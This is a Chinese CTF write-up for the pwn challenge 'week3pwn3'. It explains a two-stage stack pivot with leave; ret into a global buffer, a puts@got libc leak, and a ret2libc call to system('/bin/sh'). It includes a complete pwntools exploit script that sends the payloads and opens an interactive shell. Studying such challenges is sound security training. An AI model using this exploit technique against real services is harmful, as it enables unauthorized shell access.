# week3pwn3

## 题目简述

程序把第一段输入读入固定可写区 `0x405000`，第二段输入则可覆盖栈上的保存 `rbp` 和返回地址。单次栈空间放不下完整 ROP 链，因此使用 `leave; ret` 把栈迁移到全局可写区。第一次迁移泄露 libc，第二次迁移执行 `system('/bin/sh')`。

## 解题过程

`leave` 等价于 `mov rsp, rbp; pop rbp`。把保存的 `rbp` 改为“ROP 链起点前 8 字节”，再把返回地址改为 `leave; ret`，执行后 `rsp` 就落到预先写好的链上。第一轮在 `0x405000` 放置 `puts(puts@got) -> main`；第二轮把 ret2libc 链放在该区域偏移 `0x30` 处，并相应调整伪 `rbp`。

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
HOST = 'challenge-host'
PORT = 8003
s = remote(HOST, PORT)
libc = ELF('./libc-2.31.so')
elf = ELF('./pwn3')
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = 0x4011FF
mmap_addr = 0x405000
pop_rdi_ret = 0x00000000004012f3
leave_ret = 0x0000000000401289
ret = 0x000000000040101a

payload = p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)
s.sendlineafter(b"what's your name\n", payload)
payload = b'a' * 0x60 + p64(mmap_addr - 0x8) + p64(leave_ret)
s.sendafter(b"do you know stack pivoting?\n", payload)

libc_base = u64(s.recv(6).ljust(8, b'\x00')) - libc.sym['puts']
success('libc_base=>' + hex(libc_base))
system_addr = libc_base + libc.sym['system']
binsh_addr = libc_base + libc.search(b'/bin/sh').__next__()

payload = b'a' * 0x30 + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)
s.sendlineafter(b"what's your name\n", payload)
payload = b'a' * 0x60 + p64(mmap_addr + 0x30 - 0x8) + p64(leave_ret)
s.sendafter(b"do you know stack pivoting?\n", payload)
s.interactive()
```

## 方法总结

本题考察两次栈迁移：先把短栈溢出扩展为位于 `.bss` 的长 ROP 链，再利用泄露结果构造最终 ret2libc。迁移地址必须减 8，因为 `leave` 后紧接着的 `pop rbp` 会先消耗一个槽位；第二轮链前有 `0x30` 字节填充，所以伪 `rbp` 也要同步指向 `mmap_addr + 0x30 - 8`。使用配套 libc 的 `puts` 符号计算基址后，才能可靠定位 `system` 和 `/bin/sh`。
